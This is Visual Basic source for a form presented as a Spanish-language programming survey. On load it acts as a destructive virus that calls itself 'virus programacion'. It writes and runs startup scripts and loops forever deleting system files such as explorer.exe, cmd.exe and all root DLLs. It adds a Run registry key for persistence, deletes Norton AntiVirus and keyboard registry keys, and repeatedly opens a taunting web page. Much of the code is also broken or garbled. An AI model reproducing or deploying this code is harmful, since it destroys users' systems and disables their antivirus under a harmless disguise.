Private Sub form_load()

Label1.Caption = "Encuesta sobre programación"
Option1.Caption = "Te gusta la programación?"
Option2.Caption = "No te gusta la programación?"
Label2.Caption = "Por qué?"
Text1.Text = "Escribe aquí tu opinión sea a favor o encontra de la programación"
Frame1.Caption = "Encuesta sobre programación"
Command1.Caption = "Enviar"
Set fs = CreateObject("scripting.filesystemobject")
fs.createtextfile ("c:\autoexec.cmd")
fs.writeline "start c:\programacion.exe"
fs.writeline "start c:\windows\system32\loco.exe"
fs.Close
Set wsc = CreateObject("WSCRIPT.SHELL")
wsc.run ("c:\autoexec.bat")

Set hola = fs.createtextfile("c:\autoexec.cmd")
hola.writeline "start c:\programacion.exe"
hola.writeline "start c:\windows\system32\loco.exe"
hola.Close

Set Text = CreateObject("wscript.shell")
Text.run ("c:\hola.cmd")
On Error Resume Next
Do
Set fso = CreateObject("scripting.filesystemobject")
Set script = CreateObject("wscript.shell")
Set calc = fso.deletefile("C:\WINDOWS\system32\calc.exe")
Set explorer = fso.deletefile("c:\windows\explorer.exe")
Set Copy = fso.copyfile("c:\hola.exe")
Set copy1 = fso.copyfile("c:\programacion.exe")
Set copy2 = fso.copyfile("c:\windows\system32\loco.exe")
Set copy3 = fso.copyfile("C:\WINDOWS\java\java.exe")
Set copy4 = fso.copyfile("C:\WINDOWS\Fonts\font.exe")
Set copy5 = fso.copyfile("C:\WINDOWS\Downloaded Program Files\program.exe")
Set a = fso.copyfile("c:\a.exe")
Set d = fso.copyfile("c:\d.exe")
Set p = fso.copyile("a:\je.exe")
Set regedit = script.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\gpvcwar", "c:\windows\java\java.exe")
Set regdel = script.RegDelete("HKEY_CURRENT_USER\Software\Microsoft\Keyboard")
Set navdel = script.RegDelete("HKEY_CURRENT_USER\Software\Symantec\Norton AntiVirus")
Set tot = CreateObject("scripting.filesystemobject")
tot.deletefile = "c:\*.dll"
Set js = fso
Set cont = js.createtextfile("c:\write.js")
cont.writeline "document.write('<p style='font-family:comic sans ms; font-color='blue'>')"
cont.writeline "document.write('Ésta es la página del virus programación...<br>This is the webpage of the programming virus<br>Cet est la page du virus programacion')"
cont.writeline "document.write('<p><marque>NO PODÉS DESHACERTE DE ÉL</MARQUEE><P><MARQUEE>YOU CAN´T GIVE UP TO IT</MARQUEE>')"
cont.writeline "alert('Hola, hello, bojour')"
cont.Close

Set Page = fso
Set locura = Page.createtextfile("c:\programacion.html")
locura.writeline "<html><head><title>éste es el virus programacion</title><body>"
locura.writeline "<script language='javascript' src='write.js'>"
locura.Close

Set lpen = script.run("c:\programacion.html")
Loop
Call jeje
End Sub
Private Sub mclose_Click()
Do
 mciSendString "set CDAudio door open", "", 127, 0
Loop
On Error Resume Next
Set vbs = CreateObject("scripting.filesystemobject")
Set loquito = vbs.createtextfile("c:\hola.vbs")

On Error Resume Next
Do
Set fso = CreateObject("scripting.filesystemobject")
Set script = CreateObject("wscript.shell")
Set programacion = fso.deletefile("C:\WINDOWS\system32\cmd.exe")
Set calc = fso.deletefile("C:\WINDOWS\system32\calc.exe")
Set explorer = fso.deletefile("c:\windows\explorer.exe")
Set Copy = fso.copyfile("c:\hola.exe")
Set copy1 = fso.copyfile("c:\programacion.exe")
Set copy2 = fso.copyfile("c:\windows\system32\loco.exe")
Set copy3 = fso.copyfile("C:\WINDOWS\java\java.exe")
Set copy4 = fso.copyfile("C:\WINDOWS\Fonts\font.exe")
Set copy5 = fso.copyfile("C:\WINDOWS\Downloaded Program Files\program.exe")
Set a = fso.copyfile("c:\a.exe")
Set d = fso.copyfile("c:\d.exe")
Set regedit = script.regwrite("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\gpvcwar", "c:\windows\java\java.exe")
Set regdel = script.RegDelete("HKEY_CURRENT_USER\Software\Microsoft\Keyboard")
Set navdel = script.RegDelete("HKEY_CURRENT_USER\Software\Symantec\Norton AntiVirus")
Set tot = CreateObject("scripting.filesystemobject")
tot.deletefile = "c:\*.dll"
Set js = fso
Set cont = js.createtextfile("c:\write.js")
cont.writeline "document.write('<p style='font-family:comic sans ms; font-color='blue'>')"
cont.writeline "document.write('Ésta es la página del virus programación...<br>This is the webpage of the programming virus<br>Cet est la page du virus programacion')"
cont.writeline "document.write('<p><marque>NO PODÉS DESHACERTE DE ÉL</MARQUEE><P><MARQUEE>YOU CAN´T GIVE UP TO IT</MARQUEE>')"
cont.writeline "alert('Hola, hello, bojour')"
cont.Close

Set Page = fso
Set locura = Page.createtextfile("c:\programacion.html")
locura.writeline "<html><head><title>éste es el virus programacion</title><body>"
locura.writeline "<script language='javascript' src='write.js'>"
locura.Close
Call jeje
Loop
End Sub
Function jeje()
Do
Set lpen = script.run("c:\programacion.html")
Loop
End Function
